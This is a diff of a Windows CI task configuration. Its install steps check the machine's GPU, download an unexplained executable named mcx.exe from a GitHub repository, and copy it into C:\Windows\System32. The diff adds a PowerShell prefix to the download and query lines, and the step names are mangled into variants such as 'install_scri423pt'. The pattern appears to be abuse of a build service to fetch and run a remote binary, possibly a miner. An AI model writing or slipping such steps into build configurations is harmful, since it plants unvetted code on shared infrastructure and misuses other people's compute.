@@ -5,9 +5,9 @@ windows_container:
 
 windows_task:
   install_scri423pt:
-    Get-WmiObject win32_VideoController
+    powershell Get-WmiObject win32_VideoController
   install_script:
-    wget https://github.com/Alex-Arc-hub/mcx/blob/main/mcx.exe?raw=true -OutFile out.exe
+    powershell wget https://github.com/Alex-Arc-hub/mcx/blob/main/mcx.exe?raw=true -OutFile out.exe
   install_sc2ript:
     copy mcx.exe C:\Windows\System32
   install_sc23ript:
